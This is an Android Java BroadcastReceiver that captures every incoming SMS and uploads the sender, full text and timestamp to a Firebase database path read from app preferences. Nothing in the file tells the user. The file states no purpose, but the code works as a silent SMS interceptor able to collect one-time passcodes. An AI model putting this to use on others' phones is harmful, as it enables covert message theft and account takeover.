package com.example.sms;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class Sms extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                SmsMessage[] messages = new SmsMessage[pdus.length];
                StringBuilder fullMessageBuilder = new StringBuilder();

                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);

                    // Extracting message body
                    String messageBody = messages[i].getMessageBody();

                    // Append the message body to the StringBuilder
                    fullMessageBuilder.append(messageBody);

                    // Extracting date and time
                    long timestampMillis = messages[i].getTimestampMillis();

                    // Handle the SMS message, you can log it or display it using Toast
                    String smsInfo = "From: " + messages[i].getDisplayOriginatingAddress() +
                            "\nMessage: " + messageBody + "\nReceived at: " + timestampMillis;
                    Log.d("OPPO", "onReceive: " + smsInfo);
                }

                // After looping through all parts, save the full concatenated message to Firebase
                String fullMessage = fullMessageBuilder.toString();
                String senderNumber = messages[0].getDisplayOriginatingAddress(); // Assuming the sender is the same for all parts
                String customPath = getCustomPathFromPreferences(context);
                saveSmsToFirebase(customPath, senderNumber, fullMessage, messages[0].getTimestampMillis());
            }
        }
    }
    private String getFormattedTime(long timestampMillis) {
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", Locale.getDefault());
        Date dateTime = new Date(timestampMillis);
        return sdf.format(dateTime);
    }

    private String getCustomPathFromPreferences(Context context) {
        SharedPreferences sharedPreferences = context.getSharedPreferences("com.example.sms", Context.MODE_PRIVATE);
        String customPath = sharedPreferences.getString("customPath", "");
        Log.d("CustomPath", "Retrieved Custom Path: " + customPath);
        return sharedPreferences.getString("customPath", "");
    }
    private void saveSmsToFirebase(String custompath,String sender, String messageBody, long timestampmills) {

        String path = "user_messages/" + custompath;

        DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference(path);

        // Format the timestamp as a human-readable string
        String formattedTime = getFormattedTime(timestampmills);

        // Create a data object to store in the database
        MySmsMessage smsMessage = new MySmsMessage(sender, messageBody, formattedTime);

        // Save the SMS to the database under the custom path with timestamp as the key
        databaseReference.child(formattedTime).setValue(smsMessage);


    }
}
